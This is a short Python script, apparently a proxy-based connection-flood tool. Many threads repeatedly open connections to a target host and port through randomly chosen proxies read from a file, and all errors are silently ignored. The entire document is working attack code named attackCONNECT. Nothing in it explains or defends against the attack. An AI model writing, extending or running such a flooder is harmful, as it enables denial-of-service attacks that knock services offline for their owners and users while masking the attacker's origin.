import socks
import sys
import random
import thread
from time import sleep

proxy = open("proxy.txt", "r")
proxy_list = proxy.readlines()

def attackCONNECT():
	while True:
		try:
			proxy = random.choice(proxy_list).split(":")
			s = socks.socksocket()
			s.set_proxy(socks.HTTP, proxy[0], int(proxy[1]))
			s.connect((sys.argv[1], int(sys.argv[2])))
		except:
			pass

for i in range(int(sys.argv[3])):
			thread.start_new_thread( attackCONNECT , ())
while True:
	sleep(1)